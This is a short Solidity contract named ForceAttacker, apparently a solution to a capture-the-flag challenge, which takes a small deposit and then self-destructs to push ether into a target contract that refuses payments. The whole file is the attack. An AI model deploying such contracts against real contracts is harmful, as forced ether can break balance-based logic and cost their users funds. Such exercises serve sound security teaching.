// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttacker {
    address public owner;
    address payable public challenge;

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    constructor(address payable _challenge) public {
        owner = msg.sender;
        challenge = _challenge;
    }
    function deposit() external payable {
        require(msg.value < 0.001 ether);
    }

    function destruct() external onlyOwner {
        selfdestruct(challenge);
    }
}